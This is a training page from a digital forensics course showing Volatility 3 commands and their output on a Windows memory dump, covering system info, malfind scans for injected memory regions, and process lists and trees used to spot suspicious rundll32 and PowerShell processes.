<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/237/section/2613
// Platform Version: V1
// Module ID: 237
// Module Name: Introduction to Digital Forensics
// Module Difficulty: Medium
// Section ID: 2613
// Section Title: Practical Digital Forensics Scenario
// Page Title: Introduction to Digital Forensics
// Page Number: 07
-->

# Practical Digital Forensics Scenario

**Module Name:** Introduction to Digital Forensics **Page Number:** 07

#### INTRODUCTION TO DIGITAL FORENSICS

# Practical Digital Forensics Scenario

## Memory Analysis with Volatility v3

#### Identifying the Memory Dump's Profile

``` cmd-session
C:\Users\johndoe\Desktop\volatility3-develop>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.info
Volatility 3 Framework 2.5.0

Variable        Value

Kernel Base     0xf80150019000
DTB     0x1ad000
Symbols file:///C:/Users/johndoe/Desktop/volatility3-develop/volatility3/symbols/windows/ntkrnlmp.pdb/89284D0CA6ACC8274B9A44BD5AF9290B-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 FileLayer
KdVersionBlock  0xf80150c283a0
Major/Minor     15.19041
MachineType     34404
KeNumberProcessors      2
SystemTime      2023-08-10 09:35:40
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine      34404
PE TimeDateStamp        Fri May 20 08:24:42 2101
```

#### Identifying Injected Code

``` cmd-session
C:\Users\johndoe\Desktop\volatility3-develop>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.malfind
Volatility 3 Framework 2.5.0

PID     Process Start VPN       End VPN Tag     Protection      CommitCharge    PrivateMemory   File output     Hexdump
        Disasm

3648    rundll32.exe    0x1f2d8c20000   0x1f2d8c6dfff   VadS    PAGE_EXECUTE_READWRITE  78      1       Disabled

00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
0x1f2d8c20000:  add     byte ptr [rax], al
0x1f2d8c20002:  add     byte ptr [rax], al
0x1f2d8c20004:  add     byte ptr [rax], al
0x1f2d8c20006:  add     byte ptr [rax], al
0x1f2d8c20008:  add     byte ptr [rax], al
0x1f2d8c2000a:  add     byte ptr [rax], al
0x1f2d8c2000c:  add     byte ptr [rax], al
0x1f2d8c2000e:  add     byte ptr [rax], al
0x1f2d8c20010:  add     byte ptr [rax], al
0x1f2d8c20012:  add     byte ptr [rax], al
0x1f2d8c20014:  add     byte ptr [rax], al
0x1f2d8c20016:  add     byte ptr [rax], al
0x1f2d8c20018:  add     byte ptr [rax], al
0x1f2d8c2001a:  add     byte ptr [rax], al
0x1f2d8c2001c:  add     byte ptr [rax], al
0x1f2d8c2001e:  add     byte ptr [rax], al
0x1f2d8c20020:  add     byte ptr [rax], al
0x1f2d8c20022:  add     byte ptr [rax], al
0x1f2d8c20024:  add     byte ptr [rax], al
0x1f2d8c20026:  add     byte ptr [rax], al
0x1f2d8c20028:  add     byte ptr [rax], al
0x1f2d8c2002a:  add     byte ptr [rax], al
0x1f2d8c2002c:  add     byte ptr [rax], al
0x1f2d8c2002e:  add     byte ptr [rax], al
0x1f2d8c20030:  add     byte ptr [rax], al
0x1f2d8c20032:  add     byte ptr [rax], al
0x1f2d8c20034:  add     byte ptr [rax], al
0x1f2d8c20036:  add     byte ptr [rax], al
0x1f2d8c20038:  add     byte ptr [rax], al
0x1f2d8c2003a:  add     byte ptr [rax], al
0x1f2d8c2003c:  add     byte ptr [rax], al
0x1f2d8c2003e:  add     byte ptr [rax], al
6744    powershell.exe  0x1db40f50000   0x1db40f9dfff   VadS    PAGE_EXECUTE_READWRITE  78      1       Disabled

00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
0x1db40f50000:  add     byte ptr [rax], al
0x1db40f50002:  add     byte ptr [rax], al
0x1db40f50004:  add     byte ptr [rax], al
0x1db40f50006:  add     byte ptr [rax], al
0x1db40f50008:  add     byte ptr [rax], al
0x1db40f5000a:  add     byte ptr [rax], al
0x1db40f5000c:  add     byte ptr [rax], al
0x1db40f5000e:  add     byte ptr [rax], al
0x1db40f50010:  add     byte ptr [rax], al
0x1db40f50012:  add     byte ptr [rax], al
0x1db40f50014:  add     byte ptr [rax], al
0x1db40f50016:  add     byte ptr [rax], al
0x1db40f50018:  add     byte ptr [rax], al
0x1db40f5001a:  add     byte ptr [rax], al
0x1db40f5001c:  add     byte ptr [rax], al
0x1db40f5001e:  add     byte ptr [rax], al
0x1db40f50020:  add     byte ptr [rax], al
0x1db40f50022:  add     byte ptr [rax], al
0x1db40f50024:  add     byte ptr [rax], al
0x1db40f50026:  add     byte ptr [rax], al
0x1db40f50028:  add     byte ptr [rax], al
0x1db40f5002a:  add     byte ptr [rax], al
0x1db40f5002c:  add     byte ptr [rax], al
0x1db40f5002e:  add     byte ptr [rax], al
0x1db40f50030:  add     byte ptr [rax], al
0x1db40f50032:  add     byte ptr [rax], al
0x1db40f50034:  add     byte ptr [rax], al
0x1db40f50036:  add     byte ptr [rax], al
0x1db40f50038:  add     byte ptr [rax], al
0x1db40f5003a:  add     byte ptr [rax], al
0x1db40f5003c:  add     byte ptr [rax], al
0x1db40f5003e:  add     byte ptr [rax], al
5468    rundll32.exe    0x13c60d40000   0x13c60d8dfff   VadS    PAGE_EXECUTE_READWRITE  78      1       Disabled

00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
0x13c60d40000:  add     byte ptr [rax], al
0x13c60d40002:  add     byte ptr [rax], al
0x13c60d40004:  add     byte ptr [rax], al
0x13c60d40006:  add     byte ptr [rax], al
0x13c60d40008:  add     byte ptr [rax], al
0x13c60d4000a:  add     byte ptr [rax], al
0x13c60d4000c:  add     byte ptr [rax], al
0x13c60d4000e:  add     byte ptr [rax], al
0x13c60d40010:  add     byte ptr [rax], al
0x13c60d40012:  add     byte ptr [rax], al
0x13c60d40014:  add     byte ptr [rax], al
0x13c60d40016:  add     byte ptr [rax], al
0x13c60d40018:  add     byte ptr [rax], al
0x13c60d4001a:  add     byte ptr [rax], al
0x13c60d4001c:  add     byte ptr [rax], al
0x13c60d4001e:  add     byte ptr [rax], al
0x13c60d40020:  add     byte ptr [rax], al
0x13c60d40022:  add     byte ptr [rax], al
0x13c60d40024:  add     byte ptr [rax], al
0x13c60d40026:  add     byte ptr [rax], al
0x13c60d40028:  add     byte ptr [rax], al
0x13c60d4002a:  add     byte ptr [rax], al
0x13c60d4002c:  add     byte ptr [rax], al
0x13c60d4002e:  add     byte ptr [rax], al
0x13c60d40030:  add     byte ptr [rax], al
0x13c60d40032:  add     byte ptr [rax], al
0x13c60d40034:  add     byte ptr [rax], al
0x13c60d40036:  add     byte ptr [rax], al
0x13c60d40038:  add     byte ptr [rax], al
0x13c60d4003a:  add     byte ptr [rax], al
0x13c60d4003c:  add     byte ptr [rax], al
0x13c60d4003e:  add     byte ptr [rax], al
```

#### Identifying Running Processes

``` cmd-session
C:\Users\johndoe\Desktop\volatility3-develop>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pslist
Volatility 3 Framework 2.5.0

PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime
        File output

4       0       System  0x800adb87e040  161     -       N/A     False   2023-08-10 00:22:53.000000      N/A     Disabled
92      4       Registry        0x800adb8ee080  4       -       N/A     False   2023-08-10 00:22:48.000000      N/A
        Disabled
304     4       smss.exe        0x800ade54f040  2       -       N/A     False   2023-08-10 00:22:53.000000      N/A
        Disabled
416     404     csrss.exe       0x800adf452140  10      -       0       False   2023-08-10 00:22:55.000000      N/A
        Disabled
492     404     wininit.exe     0x800adf6a4080  1       -       0       False   2023-08-10 00:22:55.000000      N/A
        Disabled
500     484     csrss.exe       0x800adf6e7140  12      -       1       False   2023-08-10 00:22:55.000000      N/A
        Disabled
588     484     winlogon.exe    0x800adf770080  7       -       1       False   2023-08-10 00:22:55.000000      N/A
        Disabled
632     492     services.exe    0x800adf6a60c0  9       -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
660     492     lsass.exe       0x800adf781080  8       -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
760     632     svchost.exe     0x800adff42240  12      -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
772     588     fontdrvhost.ex  0x800adff45140  5       -       1       False   2023-08-10 00:22:56.000000      N/A
        Disabled
768     492     fontdrvhost.ex  0x800adff46080  5       -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
884     632     svchost.exe     0x800adff8c2c0  8       -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
972     588     dwm.exe 0x800ae0021080  15      -       1       False   2023-08-10 00:22:56.000000      N/A     Disabled
440     632     svchost.exe     0x800ae007f240  63      -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
344     632     svchost.exe     0x800ae00c02c0  16      -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
360     632     svchost.exe     0x800ae00d02c0  12      -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
876     632     svchost.exe     0x800ae00dd280  14      -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
1172    632     svchost.exe     0x800ae01542c0  20      -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
1272    632     svchost.exe     0x800ae01b92c0  17      -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
1428    4       MemCompression  0x800adb9a0040  42      -       N/A     False   2023-08-10 00:22:56.000000      N/A
        Disabled
1480    632     svchost.exe     0x800ae0309080  8       -       0       False   2023-08-10 00:22:56.000000      N/A
        Disabled
1676    632     svchost.exe     0x800ae030d2c0  3       -       0       False   2023-08-10 00:22:57.000000      N/A
        Disabled
1684    632     svchost.exe     0x800ae030f2c0  4       -       0       False   2023-08-10 00:22:57.000000      N/A
        Disabled
1788    632     spoolsv.exe     0x800adb8cc080  7       -       0       False   2023-08-10 00:22:57.000000      N/A
        Disabled
1872    632     svchost.exe     0x800ae0303080  12      -       0       False   2023-08-10 00:22:57.000000      N/A
        Disabled
2008    632     svchost.exe     0x800ae04a72c0  6       -       0       False   2023-08-10 00:22:57.000000      N/A
        Disabled
2080    440     sihost.exe      0x800ae04ba080  8       -       1       False   2023-08-10 00:22:57.000000      N/A
        Disabled
2092    632     svchost.exe     0x800ae06d32c0  8       -       1       False   2023-08-10 00:22:57.000000      N/A
        Disabled
2140    632     svchost.exe     0x800ae06d4080  10      -       0       False   2023-08-10 00:22:57.000000      N/A
        Disabled
2244    632     vm3dservice.ex  0x800ae0729240  2       -       0       False   2023-08-10 00:22:57.000000      N/A
        Disabled
2252    632     VGAuthService.  0x800adf464300  2       -       0       False   2023-08-10 00:22:57.000000      N/A
        Disabled
2276    632     MsMpEng.exe     0x800adf466280  0       -       0       False   2023-08-10 00:22:57.000000      2023-08-10 00:31:58.000000      Disabled
2284    632     vmtoolsd.exe    0x800adf4620c0  12      -       0       False   2023-08-10 00:22:57.000000      N/A
        Disabled
2380    440     taskhostw.exe   0x800ae07ea280  0       -       1       False   2023-08-10 00:22:57.000000      2023-08-10 00:23:00.000000      Disabled
2404    440     taskhostw.exe   0x800ae07f22c0  8       -       1       False   2023-08-10 00:22:57.000000      N/A
        Disabled
2520    2244    vm3dservice.ex  0x800ae0530080  2       -       1       False   2023-08-10 00:22:58.000000      N/A
        Disabled
2840    876     ctfmon.exe      0x800ae0584080  8       -       1       False   2023-08-10 00:22:58.000000      N/A
        Disabled
2880    632     svchost.exe     0x800ae0841240  2       -       0       False   2023-08-10 00:22:58.000000      N/A
        Disabled
640     632     dllhost.exe     0x800ae0a1f280  10      -       0       False   2023-08-10 00:22:59.000000      N/A
        Disabled
3128    760     WmiPrvSE.exe    0x800ae0ab8280  13      -       0       False   2023-08-10 00:23:00.000000      N/A
        Disabled
3240    632     msdtc.exe       0x800ae0af9280  9       -       0       False   2023-08-10 00:23:00.000000      N/A
        Disabled
3508    588     userinit.exe    0x800ae0b75300  0       -       1       False   2023-08-10 00:23:00.000000      2023-08-10 00:23:24.000000      Disabled
4260    632     svchost.exe     0x800ae0f292c0  7       -       1       False   2023-08-10 00:23:03.000000      N/A
        Disabled
4400    632     SearchIndexer.  0x800ae0fcb240  16      -       0       False   2023-08-10 00:23:04.000000      N/A
        Disabled
4724    760     RuntimeBroker.  0x800ae0e27080  3       -       1       False   2023-08-10 00:23:04.000000      N/A
        Disabled
4932    760     RuntimeBroker.  0x800ae11532c0  10      -       1       False   2023-08-10 00:23:05.000000      N/A
        Disabled
1908    760     Microsoft.Phot  0x800ae164b0c0  15      -       1       False   2023-08-10 00:23:06.000000      N/A
        Disabled
5392    760     RuntimeBroker.  0x800ae17a52c0  1       -       1       False   2023-08-10 00:23:07.000000      N/A
        Disabled
5848    760     RuntimeBroker.  0x800ae10c62c0  2       -       1       False   2023-08-10 00:23:10.000000      N/A
        Disabled
5912    760     RuntimeBroker.  0x800ae1804200  4       -       1       False   2023-08-10 00:23:11.000000      N/A
        Disabled
1996    632     svchost.exe     0x800ae180d080  10      -       0       False   2023-08-10 00:23:14.000000      N/A
        Disabled
1584    876     dasHost.exe     0x800ae10c5080  3       -       0       False   2023-08-10 00:23:14.000000      N/A
        Disabled
3912    3552    SecurityHealth  0x800ae148a080  1       -       1       False   2023-08-10 00:23:17.000000      N/A
        Disabled
3964    632     SecurityHealth  0x800ae1489280  9       -       0       False   2023-08-10 00:23:17.000000      N/A
        Disabled
5984    3552    vmtoolsd.exe    0x800ae148f080  6       -       1       False   2023-08-10 00:23:17.000000      N/A
        Disabled
6908    760     SkypeApp.exe    0x800ae1ee0240  41      -       1       False   2023-08-10 00:23:46.000000      N/A
        Disabled
7032    760     RuntimeBroker.  0x800ae1b91300  2       -       1       False   2023-08-10 00:23:49.000000      N/A
        Disabled
4920    632     svchost.exe     0x800ae24692c0  2       -       0       False   2023-08-10 00:24:00.000000      N/A
        Disabled
1260    760     RuntimeBroker.  0x800ae15f0080  1       -       1       False   2023-08-10 00:24:09.000000      N/A
        Disabled
2320    760     ApplicationFra  0x800ae21a92c0  3       -       1       False   2023-08-10 00:24:10.000000      N/A
        Disabled
2440    760     WWAHost.exe     0x800ae24752c0  26      -       1       False   2023-08-10 00:24:10.000000      N/A
        Disabled
6732    760     dllhost.exe     0x800ae170c340  6       -       1       False   2023-08-10 00:24:12.000000      N/A
        Disabled
7028    760     WinStore.App.e  0x800ae2937080  12      -       1       False   2023-08-10 00:24:26.000000      N/A
        Disabled
7320    632     svchost.exe     0x800ae2b36080  3       -       0       False   2023-08-10 00:24:49.000000      N/A
        Disabled
7884    632     SgrmBroker.exe  0x800ae1f63240  7       -       0       False   2023-08-10 00:24:58.000000      N/A
        Disabled
8024    632     svchost.exe     0x800ae139a0c0  3       -       0       False   2023-08-10 00:24:58.000000      N/A
        Disabled
8100    632     svchost.exe     0x800ae1f67080  8       -       0       False   2023-08-10 00:24:59.000000      N/A
        Disabled
6160    632     svchost.exe     0x800ae23c8080  3       -       0       False   2023-08-10 00:25:22.000000      N/A
        Disabled
3372    440     powershell.exe  0x800ae1fe1080  8       -       0       False   2023-08-10 00:30:32.000000      N/A
        Disabled
3136    3372    conhost.exe     0x800ae25e3300  4       -       0       False   2023-08-10 00:30:32.000000      N/A
        Disabled
6564    3372    Autorunsc64.ex  0x800ae2ddf080  1       -       0       False   2023-08-10 00:30:40.000000      N/A
        Disabled
7148    588     explorer.exe    0x800ae0d4b080  48      -       1       False   2023-08-10 00:30:56.000000      N/A
        Disabled
1380    632     Sysmon64.exe    0x800ae1b74080  12      -       0       False   2023-08-10 00:30:58.000000      N/A
        Disabled
4208    760     unsecapp.exe    0x800ae2c1d080  3       -       0       False   2023-08-10 00:30:58.000000      N/A
        Disabled
7316    760     StartMenuExper  0x800ae1360080  6       -       1       False   2023-08-10 00:30:58.000000      N/A
        Disabled
4640    760     TextInputHost.  0x800ae0d90340  9       -       1       False   2023-08-10 00:30:59.000000      N/A
        Disabled
672     760     SearchApp.exe   0x800ae12b4340  46      -       1       False   2023-08-10 00:31:00.000000      N/A
        Disabled
4504    760     ShellExperienc  0x800ae1456080  15      -       1       False   2023-08-10 00:31:01.000000      N/A
        Disabled
5520    760     RuntimeBroker.  0x800ae10b6080  2       -       1       False   2023-08-10 00:33:03.000000      N/A
        Disabled
2868    760     SkypeBackgroun  0x800ae2961080  4       -       1       False   2023-08-10 09:10:28.000000      N/A
        Disabled
7820    632     Velociraptor.e  0x800ae0b5e080  15      -       0       False   2023-08-10 09:11:16.000000      N/A
        Disabled
6388    7148    chrome.exe      0x800ae1389080  0       -       1       False   2023-08-10 09:11:41.000000      2023-08-10 09:15:24.000000      Disabled
3648    7148    rundll32.exe    0x800ae16c6080  4       -       1       False   2023-08-10 09:15:14.000000      N/A
        Disabled
6744    908     powershell.exe  0x800ae5da50c0  10      -       1       False   2023-08-10 09:21:16.000000      N/A
        Disabled
5692    6744    conhost.exe     0x800ae19e4300  3       -       1       False   2023-08-10 09:21:16.000000      N/A
        Disabled
5468    7512    rundll32.exe    0x800ae01f0080  3       -       0       False   2023-08-10 09:23:15.000000      N/A
        Disabled
3944    632     VSSVC.exe       0x800ae16c4080  5       -       0       False   2023-08-10 09:31:21.000000      N/A
        Disabled
7292    632     svchost.exe     0x800ae2de0080  5       -       0       False   2023-08-10 09:31:21.000000      N/A
        Disabled
2432    760     smartscreen.ex  0x800ae29ac080  7       -       1       False   2023-08-10 09:32:30.000000      N/A
        Disabled
892     7148    chrome.exe      0x800ae10d2080  42      -       1       False   2023-08-10 09:32:30.000000      N/A
        Disabled
4492    892     chrome.exe      0x800ae2c53080  8       -       1       False   2023-08-10 09:32:31.000000      N/A
        Disabled
7208    892     chrome.exe      0x800ae4a7d080  17      -       1       False   2023-08-10 09:32:32.000000      N/A
        Disabled
2784    892     chrome.exe      0x800ae26a92c0  15      -       1       False   2023-08-10 09:32:32.000000      N/A
        Disabled
3052    892     chrome.exe      0x800ae2847080  9       -       1       False   2023-08-10 09:32:32.000000      N/A
        Disabled
7416    892     chrome.exe      0x800ae26b32c0  15      -       1       False   2023-08-10 09:32:33.000000      N/A
        Disabled
4972    892     chrome.exe      0x800ae2b17080  14      -       1       False   2023-08-10 09:32:34.000000      N/A
        Disabled
4296    892     chrome.exe      0x800ae0ee3080  14      -       1       False   2023-08-10 09:32:34.000000      N/A
        Disabled
3416    892     chrome.exe      0x800ae0e62080  14      -       1       False   2023-08-10 09:32:34.000000      N/A
        Disabled
4040    7820    winpmem_mini_x  0x800ae1fe8080  3       -       0       False   2023-08-10 09:35:40.000000      N/A
        Disabled
5112    4040    conhost.exe     0x800ae1334080  6       -       0       False   2023-08-10 09:35:40.000000      N/A
        Disabled
```

``` cmd-session
C:\Users\johndoe\Desktop\volatility3-develop>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pstree
Volatility 3 Framework 2.5.0

PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime

4       0       System  0x800adb87e040  161     -       N/A     False   2023-08-10 00:22:53.000000      N/A
* 304   4       smss.exe        0x800ade54f040  2       -       N/A     False   2023-08-10 00:22:53.000000      N/A
* 1428  4       MemCompression  0x800adb9a0040  42      -       N/A     False   2023-08-10 00:22:56.000000      N/A
* 92    4       Registry        0x800adb8ee080  4       -       N/A     False   2023-08-10 00:22:48.000000      N/A
416     404     csrss.exe       0x800adf452140  10      -       0       False   2023-08-10 00:22:55.000000      N/A
492     404     wininit.exe     0x800adf6a4080  1       -       0       False   2023-08-10 00:22:55.000000      N/A
* 632   492     services.exe    0x800adf6a60c0  9       -       0       False   2023-08-10 00:22:56.000000      N/A
** 640  632     dllhost.exe     0x800ae0a1f280  10      -       0       False   2023-08-10 00:22:59.000000      N/A
** 1676 632     svchost.exe     0x800ae030d2c0  3       -       0       False   2023-08-10 00:22:57.000000      N/A
** 7820 632     Velociraptor.e  0x800ae0b5e080  15      -       0       False   2023-08-10 09:11:16.000000      N/A
*** 4040        7820    winpmem_mini_x  0x800ae1fe8080  3       -       0       False   2023-08-10 09:35:40.000000
        N/A
**** 5112       4040    conhost.exe     0x800ae1334080  6       -       0       False   2023-08-10 09:35:40.000000
        N/A
** 6160 632     svchost.exe     0x800ae23c8080  3       -       0       False   2023-08-10 00:25:22.000000      N/A
** 1172 632     svchost.exe     0x800ae01542c0  20      -       0       False   2023-08-10 00:22:56.000000      N/A
** 1684 632     svchost.exe     0x800ae030f2c0  4       -       0       False   2023-08-10 00:22:57.000000      N/A
** 7320 632     svchost.exe     0x800ae2b36080  3       -       0       False   2023-08-10 00:24:49.000000      N/A
** 4260 632     svchost.exe     0x800ae0f292c0  7       -       1       False   2023-08-10 00:23:03.000000      N/A
** 8100 632     svchost.exe     0x800ae1f67080  8       -       0       False   2023-08-10 00:24:59.000000      N/A
** 3240 632     msdtc.exe       0x800ae0af9280  9       -       0       False   2023-08-10 00:23:00.000000      N/A
** 2092 632     svchost.exe     0x800ae06d32c0  8       -       1       False   2023-08-10 00:22:57.000000      N/A
** 4400 632     SearchIndexer.  0x800ae0fcb240  16      -       0       False   2023-08-10 00:23:04.000000      N/A
** 440  632     svchost.exe     0x800ae007f240  63      -       0       False   2023-08-10 00:22:56.000000      N/A
*** 2080        440     sihost.exe      0x800ae04ba080  8       -       1       False   2023-08-10 00:22:57.000000
        N/A
*** 2404        440     taskhostw.exe   0x800ae07f22c0  8       -       1       False   2023-08-10 00:22:57.000000
        N/A
*** 2380        440     taskhostw.exe   0x800ae07ea280  0       -       1       False   2023-08-10 00:22:57.000000
        2023-08-10 00:23:00.000000
*** 3372        440     powershell.exe  0x800ae1fe1080  8       -       0       False   2023-08-10 00:30:32.000000
        N/A
**** 3136       3372    conhost.exe     0x800ae25e3300  4       -       0       False   2023-08-10 00:30:32.000000
        N/A
**** 6564       3372    Autorunsc64.ex  0x800ae2ddf080  1       -       0       False   2023-08-10 00:30:40.000000
        N/A
** 4920 632     svchost.exe     0x800ae24692c0  2       -       0       False   2023-08-10 00:24:00.000000      N/A
** 2880 632     svchost.exe     0x800ae0841240  2       -       0       False   2023-08-10 00:22:58.000000      N/A
** 2244 632     vm3dservice.ex  0x800ae0729240  2       -       0       False   2023-08-10 00:22:57.000000      N/A
*** 2520        2244    vm3dservice.ex  0x800ae0530080  2       -       1       False   2023-08-10 00:22:58.000000
        N/A
** 1480 632     svchost.exe     0x800ae0309080  8       -       0       False   2023-08-10 00:22:56.000000      N/A
** 2252 632     VGAuthService.  0x800adf464300  2       -       0       False   2023-08-10 00:22:57.000000      N/A
** 1996 632     svchost.exe     0x800ae180d080  10      -       0       False   2023-08-10 00:23:14.000000      N/A
** 7884 632     SgrmBroker.exe  0x800ae1f63240  7       -       0       False   2023-08-10 00:24:58.000000      N/A
** 1872 632     svchost.exe     0x800ae0303080  12      -       0       False   2023-08-10 00:22:57.000000      N/A
** 7292 632     svchost.exe     0x800ae2de0080  5       -       0       False   2023-08-10 09:31:21.000000      N/A
** 344  632     svchost.exe     0x800ae00c02c0  16      -       0       False   2023-08-10 00:22:56.000000      N/A
** 2008 632     svchost.exe     0x800ae04a72c0  6       -       0       False   2023-08-10 00:22:57.000000      N/A
** 8024 632     svchost.exe     0x800ae139a0c0  3       -       0       False   2023-08-10 00:24:58.000000      N/A
** 2140 632     svchost.exe     0x800ae06d4080  10      -       0       False   2023-08-10 00:22:57.000000      N/A
** 2276 632     MsMpEng.exe     0x800adf466280  0       -       0       False   2023-08-10 00:22:57.000000      2023-08-10 00:31:58.000000
** 1380 632     Sysmon64.exe    0x800ae1b74080  12      -       0       False   2023-08-10 00:30:58.000000      N/A
** 360  632     svchost.exe     0x800ae00d02c0  12      -       0       False   2023-08-10 00:22:56.000000      N/A
** 3964 632     SecurityHealth  0x800ae1489280  9       -       0       False   2023-08-10 00:23:17.000000      N/A
** 3944 632     VSSVC.exe       0x800ae16c4080  5       -       0       False   2023-08-10 09:31:21.000000      N/A
** 876  632     svchost.exe     0x800ae00dd280  14      -       0       False   2023-08-10 00:22:56.000000      N/A
*** 2840        876     ctfmon.exe      0x800ae0584080  8       -       1       False   2023-08-10 00:22:58.000000
        N/A
*** 1584        876     dasHost.exe     0x800ae10c5080  3       -       0       False   2023-08-10 00:23:14.000000
        N/A
** 2284 632     vmtoolsd.exe    0x800adf4620c0  12      -       0       False   2023-08-10 00:22:57.000000      N/A
** 760  632     svchost.exe     0x800adff42240  12      -       0       False   2023-08-10 00:22:56.000000      N/A
*** 2432        760     smartscreen.ex  0x800ae29ac080  7       -       1       False   2023-08-10 09:32:30.000000
        N/A
*** 2440        760     WWAHost.exe     0x800ae24752c0  26      -       1       False   2023-08-10 00:24:10.000000
        N/A
*** 5392        760     RuntimeBroker.  0x800ae17a52c0  1       -       1       False   2023-08-10 00:23:07.000000
        N/A
*** 2320        760     ApplicationFra  0x800ae21a92c0  3       -       1       False   2023-08-10 00:24:10.000000
        N/A
*** 5520        760     RuntimeBroker.  0x800ae10b6080  2       -       1       False   2023-08-10 00:33:03.000000
        N/A
*** 7316        760     StartMenuExper  0x800ae1360080  6       -       1       False   2023-08-10 00:30:58.000000
        N/A
*** 4504        760     ShellExperienc  0x800ae1456080  15      -       1       False   2023-08-10 00:31:01.000000
        N/A
*** 5912        760     RuntimeBroker.  0x800ae1804200  4       -       1       False   2023-08-10 00:23:11.000000
        N/A
*** 4640        760     TextInputHost.  0x800ae0d90340  9       -       1       False   2023-08-10 00:30:59.000000
        N/A
*** 672 760     SearchApp.exe   0x800ae12b4340  46      -       1       False   2023-08-10 00:31:00.000000      N/A
*** 2868        760     SkypeBackgroun  0x800ae2961080  4       -       1       False   2023-08-10 09:10:28.000000
        N/A
*** 3128        760     WmiPrvSE.exe    0x800ae0ab8280  13      -       0       False   2023-08-10 00:23:00.000000
        N/A
*** 4932        760     RuntimeBroker.  0x800ae11532c0  10      -       1       False   2023-08-10 00:23:05.000000
        N/A
*** 6732        760     dllhost.exe     0x800ae170c340  6       -       1       False   2023-08-10 00:24:12.000000
        N/A
*** 5848        760     RuntimeBroker.  0x800ae10c62c0  2       -       1       False   2023-08-10 00:23:10.000000
        N/A
*** 1260        760     RuntimeBroker.  0x800ae15f0080  1       -       1       False   2023-08-10 00:24:09.000000
        N/A
*** 4208        760     unsecapp.exe    0x800ae2c1d080  3       -       0       False   2023-08-10 00:30:58.000000
        N/A
*** 1908        760     Microsoft.Phot  0x800ae164b0c0  15      -       1       False   2023-08-10 00:23:06.000000
        N/A
*** 4724        760     RuntimeBroker.  0x800ae0e27080  3       -       1       False   2023-08-10 00:23:04.000000
        N/A
*** 7028        760     WinStore.App.e  0x800ae2937080  12      -       1       False   2023-08-10 00:24:26.000000
        N/A
*** 7032        760     RuntimeBroker.  0x800ae1b91300  2       -       1       False   2023-08-10 00:23:49.000000
        N/A
*** 6908        760     SkypeApp.exe    0x800ae1ee0240  41      -       1       False   2023-08-10 00:23:46.000000
        N/A
** 884  632     svchost.exe     0x800adff8c2c0  8       -       0       False   2023-08-10 00:22:56.000000      N/A
** 1272 632     svchost.exe     0x800ae01b92c0  17      -       0       False   2023-08-10 00:22:56.000000      N/A
** 1788 632     spoolsv.exe     0x800adb8cc080  7       -       0       False   2023-08-10 00:22:57.000000      N/A
* 768   492     fontdrvhost.ex  0x800adff46080  5       -       0       False   2023-08-10 00:22:56.000000      N/A
* 660   492     lsass.exe       0x800adf781080  8       -       0       False   2023-08-10 00:22:56.000000      N/A
500     484     csrss.exe       0x800adf6e7140  12      -       1       False   2023-08-10 00:22:55.000000      N/A
588     484     winlogon.exe    0x800adf770080  7       -       1       False   2023-08-10 00:22:55.000000      N/A
* 7148  588     explorer.exe    0x800ae0d4b080  48      -       1       False   2023-08-10 00:30:56.000000      N/A
** 3648 7148    rundll32.exe    0x800ae16c6080  4       -       1       False   2023-08-10 09:15:14.000000      N/A
** 892  7148    chrome.exe      0x800ae10d2080  42      -       1       False   2023-08-10 09:32:30.000000      N/A
*** 2784        892     chrome.exe      0x800ae26a92c0  15      -       1       False   2023-08-10 09:32:32.000000
        N/A
*** 3416        892     chrome.exe      0x800ae0e62080  14      -       1       False   2023-08-10 09:32:34.000000
        N/A
*** 7208        892     chrome.exe      0x800ae4a7d080  17      -       1       False   2023-08-10 09:32:32.000000
        N/A
*** 4296        892     chrome.exe      0x800ae0ee3080  14      -       1       False   2023-08-10 09:32:34.000000
        N/A
*** 4492        892     chrome.exe      0x800ae2c53080  8       -       1       False   2023-08-10 09:32:31.000000
        N/A
*** 3052        892     chrome.exe      0x800ae2847080  9       -       1       False   2023-08-10 09:32:32.000000
        N/A
*** 4972        892     chrome.exe      0x800ae2b17080  14      -       1       False   2023-08-10 09:32:34.000000
        N/A
*** 7416        892     chrome.exe      0x800ae26b32c0  15      -       1       False   2023-08-10 09:32:33.000000
        N/A
** 6388 7148    chrome.exe      0x800ae1389080  0       -       1       False   2023-08-10 09:11:41.000000      2023-08-10 09:15:24.000000
* 3508  588     userinit.exe    0x800ae0b75300  0       -       1       False   2023-08-10 00:23:00.000000      2023-08-10 00:23:24.000000
